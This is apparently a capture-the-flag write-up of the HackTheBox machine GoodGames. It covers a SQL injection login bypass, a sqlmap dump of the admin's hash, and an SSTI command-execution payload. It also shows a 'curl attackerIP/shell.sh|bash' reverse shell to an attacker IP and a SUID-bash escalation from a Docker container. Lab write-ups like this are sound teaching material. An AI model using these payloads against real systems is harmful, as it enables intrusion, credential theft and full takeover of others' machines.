---
title: "HackTheBox - GoodGames"
author: Nasrallah
description: ""
date: 2023-05-01 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, sqli, ssti, crack, docker, sqlmap]
img_path: /assets/img/hackthebox/machines/goodgames
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [GoodGames](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com). 

![](0.png)

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.130
Host is up (0.32s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-title: GoodGames | Community and Store
Service Info: Host: goodgames.htb
```

We found werkzeug web server running on port 80 with the hostname `goodgames.htb`, let's add it to `/etc/hosts`

### Web

Let's navigate to `goodgames.htb`

![](1.png)

We find a website related to video games. After navigating throught the website, we find a login form.

![](2.png)

Tried some default credentials but it didn't work, then tried sql injection and managed to login as admin with the payload `' or 1=1 -- -` after we proxy the traffic through burp.

![](3.png)

We get redirected to profile page and find a new link.

![](4.png)

The link goes to `internal-administration.goodgames.htb`, so we need to add it to `/etc/hosts`.

![](5.png)

We got a login page, and again i tried default credential and sql injection but neither worked this time.

### sqlmap

Since the first login form was vulnerable to sql injection, let's go to burp and copy the login request to a file.

```text
POST /login HTTP/1.1
Host: goodgames.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://goodgames.htb
DNT: 1
Connection: close
Referer: http://goodgames.htb/
Upgrade-Insecure-Requests: 1

email=asdf&password=asdf
```

Now we feed the file to `sqlmap` and let it does it's magic.

```bash
sqlmap -r login.req --batch
```

The injection is time based so this might take a long time.

After some time, we find a database called `main` and a table called `user`, let's dump the user table

```terminal
$ sqlmap -r login.req --batch -D main -T user --dump
[...]
Database: main
Table: user
[1 entry]
+----+-------+---------------------+----------------------------------+
| id | name  | email               | password                         |
+----+-------+---------------------+----------------------------------+
| 1  | admin | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec |
+----+-------+---------------------+----------------------------------+
```

After some time, we manage to get the admin's hash. The hash looks like MD5 so we can use [crackstation](https://crackstation.net/) to crack it.

![](12.png)

We got the password, now let's login to flask volt with the credentials `admin:superadministrator`

![](6.png)

## **Foothold**

Going to `Settings` page, we find a form where we can change our name.

![](7.png)

The username we submitted got displayed back to us.

Since the the website uses python, one of the vulnerabilities to check for is `SSTI`, so let's change the name to `{{7*7}}`

![](8.png)

The website is vulnerable, now let's try executing command using payloads from [PayloadsAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-ospopenread).

```python
\{\{ self.\_\_init\_\_.\_\_globals\_\_.\_\_builtins\_\_.\_\_import\_\_('os').popen('id').read() \}\}
```

![](9.png)

We run the command `id` and we got back root. Now let's get a reverse shell.

Instead of `id` i run `curl attackerIP/shell.sh|bash`, this command requests a the file `shell.sh` which has a reverse shell code `/bin/bash -i >& /dev/tcp/10.10.10.10/9001 0>&1` then pips it ot `bash` to get it executed.

![](10.png)

And we got a shell

## **Privilege Escalation**

We find ourselves in a docker container, let's check the network interfaces and ip addresses.

```terminal
root@3a453ab39d3d:/backend/project# ip a                                                                                                                      
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000                                                                   
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                      
    inet 127.0.0.1/8 scope host lo                                             
       valid_lft forever preferred_lft forever                                 
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default                                                                  
    link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0                                                                                         
    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0                    
       valid_lft forever preferred_lft forever 
```

Our ip is `172.19.0.2`, this means the host is `172.19.0.1`.

I uploaded a static version of `nmap` and scanned the host.

```terminal
root@3a453ab39d3d:~# ./nmap 172.19.0.1                                          

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-05-06 11:56 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.19.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000028s latency).
Not shown: 1205 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:28:C6:BF:0E (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 14.60 seconds
```

We found two open ports, 22 running ssh and 80 which is http web server.

On the home directory we find user `augustus` but can't be found in /etc/passwd, so i tried to ssh to `172.19.0.1` as that user with the password we found earlier.


```terminal
root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$
```

It worked! Now to get root is pretty easy, we copy `bash` to our current directory, exit out of ssh to get back to docker, and as root in the docker container, we change to ownership of `bash` to root and give it suid permission. Then we ssh back and run `bash -p`.

```terminal
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ exit
logout
Connection to 172.19.0.1 closed.
root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# chmod +s bash
```

We got root.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).